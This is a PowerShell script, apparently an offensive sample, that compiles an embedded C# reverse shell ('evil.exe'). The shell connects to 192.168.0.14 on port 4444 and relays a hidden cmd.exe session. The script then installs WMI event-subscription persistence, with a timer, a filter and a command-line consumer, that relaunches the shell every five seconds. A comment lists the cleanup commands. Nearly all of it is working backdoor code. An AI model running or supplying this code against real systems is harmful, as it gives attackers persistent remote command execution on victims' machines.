<#

To remove Events run following

Get-WmiObject __EventFilter -namespace root\subscription -filter "name='EvilExeFilter'" | Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='EvilExeConsumer'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='EvilExeFilter'""" | Remove-WmiObject
Remove-CimInstance -Query 'select * from __IntervalTimerInstruction where TimerId="MyTimerId"'



#>

$workingDirectory = (Get-location).Path.ToString()
$pathToEvil = $workingDirectory + "\evil.exe"

$source = @"
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
    public class Program
    {
        static StreamWriter streamWriter;

        public static void Main(string[] args)
        {
            using (TcpClient client = new TcpClient("192.168.0.14", 4444))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                
                
            }
        }

    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly $pathToEvil -OutputType ConsoleApplication

New-CimInstance -ClassName __IntervalTimerInstruction -Property @{TimerId="MyTimerId";IntervalBetweenEvents=[uint32]5000}


$WQLQuery = 'SELECT * FROM __TimerEvent where TimerId="MyTimerId"'

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="EvilExeFilter";
                    EventNameSpace="root\cimv2";
                    QueryLanguage="WQL";
                    Query=$WQLQuery}


$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="EvilExeConsumer";
                 ExecutablePath = $pathToEvil;
                 CommandLineTemplate = $pathToEvil
                }


Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}